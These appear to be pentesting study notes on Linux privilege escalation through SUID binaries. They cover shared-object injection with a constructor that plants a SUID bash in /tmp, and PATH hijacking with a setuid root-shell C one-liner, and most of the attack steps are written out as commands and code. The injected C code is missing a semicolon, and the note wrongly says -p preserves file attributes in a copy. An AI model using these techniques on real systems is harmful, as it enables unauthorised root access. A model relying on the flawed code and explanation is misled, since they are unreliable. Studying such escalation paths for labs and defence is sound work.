- **SUID** stands for Set User ID, which is a special permission flag in Linux that givers users the ability to run files as the owner of those files.
**Representation:** **_`-rwsr-xr-x`_**

- **SGID** stands for Set Group ID, which is a special permission flag in Linux that modifies how files and directories are treated with respect to group permissions.
**Representation:** **_`-rwxr-sr-x`_**

The following command can be used to search for SUID files:
**_`find / -perm -u=s -type f 2>/dev/null`_**

The following command can be used to search for SGID files:
**_`find / -perm -g=s -type f 2>/dev/null`_**
***
## P.E via Shared Object Injection:

- Initially scan for files with SUID bit set using **_`find / -perm -04000 -type f -ls 2>/dev/null`_** and look for files named **_so_** as in shared object.

- If you run **_`ls -la`_** on this shared object file, this file would have both, SUID and SGID, bit set. -- **_`-rwsr-sr-x`_**

- Next, run the binary using **_`strace`_** to see what is happening in the background. 
**_`strace <so binary file path> 2>&1`_** 

- Look for any dependencies that the binary uses, such as files, which can be modified or injected with malicious code which when accessed or executed by the shared object file gives us root access. 

**NOTE:** If the dependency file mentioned within the output is not available, we can create one with malicious code written inside the dependency file. 
***
### Simple malicious C code for .c file injection:

This code will copy the **_`/bin/bash`_** file to the **_`/tmp`_** folder and set the SUID bit to the **_`/tmp/bash`_**. 

**NOTE:** The **_`-p`_** flag is used to copy a file while maintaining the attributes of the original file.

```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject()
{
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p")
}
```
***
## P.E via Environmental Variables:

Environmental Variables are dynamic values that can impact the behavior of programs and processes on a machine. 

They are used to store information that needs to be accessible by multiple system programs or processes. 

**NOTE:** Run **_`printenv`_** to list all the current environment variables in Linux. 

- Initially run **_`find / -type f -perm -04000 -ls 2>/dev/null`_** and look for SUID binaries with _**env**_ in their names.

- Run **_`strings`_** on the binary to check if it runs any system binaries/commands. Once a system command has been identified, create a file named after the system command under the **_`/tmp`_** folder with a malicious C code written into the file.
**_`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/<filename>.c`_**


- Now compile the .c file using **_`gcc /tmp/<filename>.c -o /tmp/<binary name>`_**. Now include the **_`/tmp`_** into the PATH using **_`export PATH=/tmp:$PATH`_**.

- Run **_`echo $PATH`_** to check if the **_`/tmp`_** folder has been added to the PATH. If the **_`/tmp`_** folder has been added to **_$PATH_**, run the **_env_** binary and this will give you a root shell.

***
